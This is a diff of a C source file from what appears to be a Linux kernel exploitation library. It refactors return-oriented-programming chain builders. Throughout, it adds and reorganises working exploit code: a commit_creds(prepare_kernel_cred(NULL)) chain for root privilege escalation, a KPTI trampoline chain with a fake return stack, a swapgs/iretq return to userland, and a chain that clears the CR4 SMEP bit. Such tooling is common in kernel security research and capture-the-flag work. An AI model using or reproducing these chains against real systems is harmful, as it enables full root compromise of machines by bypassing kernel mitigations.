@@ -2,18 +2,21 @@
 #include <stdint.h>
 #include "utils.h"
 #include "rop.h"
+#include "kpti_trampoline.h"
 
-/* ============= Kcreds Commit ============= */
 
-/* ROP: prepare_kernel_cred -> commit_creds -> swapgs -> iretq */
-size_t chain_kcred_iretq(rop_buffer_t rop,
+/* ============= Kcreds ============= */
+
+/* 
+ * Privesc to root:
+ *      commit_creds(prepare_kernel_cred(NULL)); 
+ */
+
+size_t chain_commit_creds(rop_buffer_t rop,
                         uintptr_t pop_rdi_ret,
                         uintptr_t prepare_kernel_cred,
                         rop_buffer_t mov_rdi_rax_rop,
-                        uintptr_t commit_creds,
-                        uintptr_t swapgs_pop_rbp_ret,
-                        uintptr_t iretq,
-                        iretq_user_ctx_t ctx)
+                        uintptr_t commit_creds)
 {
     size_t i = 0;
 
@@ -30,11 +33,57 @@ size_t chain_kcred_iretq(rop_buffer_t rop,
     // Step 3: commit_creds(rdi)
     PUSH_ROP(rop, i, commit_creds);
 
-    // Step 4: swapgs; pop rbp; ret
+    return i;
+}
+
+
+/* ============= KPTI Trampoline ============= */
+
+/* 
+ * KPTI trampoline (swapgs_restore_regs_and_return_to_usermode + 22)
+ *          +
+ * Fake trampoline stack:
+ *      junk,
+ *      junk,
+ *      user_rip,
+ *      user_cs,
+ *      user_rflags,
+ *      user_rsp,
+ *      user_ss
+ */
+size_t chain_kpti_trampoline(rop_buffer_t rop,
+                            uintptr_t kpti_trampoline,
+                            iretq_user_ctx_t ctx)
+{
+    size_t i = 0;
+
+    PUSH_ROP(rop, i, kpti_trampoline);
+    PUSH_ROP(rop, i, 0);
+    PUSH_ROP(rop, i, 0);
+    PUSH_ROP(rop, i, ctx.rip);
+    PUSH_ROP(rop, i, ctx.cs);
+    PUSH_ROP(rop, i, ctx.rflags);
+    PUSH_ROP(rop, i, ctx.rsp);
+    PUSH_ROP(rop, i, ctx.ss);
+
+    return i;
+}
+
+
+/* ============= iretq ============= */
+
+size_t chain_swapgs_iretq(rop_buffer_t rop,
+                        uintptr_t swapgs_pop_rbp_ret,
+                        uintptr_t iretq,
+                        iretq_user_ctx_t ctx)
+{
+    size_t i = 0;
+
+    // Step 1: swapgs; pop rbp; ret
     PUSH_ROP(rop, i, swapgs_pop_rbp_ret);
     PUSH_ROP(rop, i, 0xdeadbeef);
 
-    // Step 5: iretq — transition back to userland
+    // Step 2: iretq — transition back to userland
     PUSH_ROP(rop, i, iretq);
     PUSH_ROP(rop, i, ctx.rip);
     PUSH_ROP(rop, i, ctx.cs);
@@ -48,7 +97,7 @@ size_t chain_kcred_iretq(rop_buffer_t rop,
 
 /* ============= CR4 =============
  * (depreciated since Linux 5.1)
- * */
+ */
 
 /* CR4 SMEP off: zero 20th bit */
 size_t chain_cr4_smep(rop_buffer_t rop,
@@ -78,22 +127,9 @@ size_t chain_cr4_smep(rop_buffer_t rop,
  *
  * @dst:       target ROP buffer to write into
  * @dst_off:   pointer to the current offset (will be updated)
- * @list:      array of ROP buffers to concatenate
+* @list:      array of ROP buffers to concatenate
  * @count:     number of ROP buffers in the list
  */
-/*size_t concat_rop_list(rop_buffer_t dst,*/
-                        /*size_t *dst_off,*/
-                        /*const rop_buffer_t *list,*/
-                        /*size_t count)*/
-/*{*/
-    /*for (size_t i = 0; i < count; ++i) {*/
-        /*for (size_t j = 0; j < list[i].count; ++j) {*/
-            /*PUSH_ROP(dst, *dst_off, list[i].chain[j]);*/
-        /*}*/
-    /*}*/
-    /*return *dst_off;*/
-/*}*/
-
 size_t concat_rop_list(rop_buffer_t dst,
                        size_t *dst_off,
                        const rop_buffer_t *list,
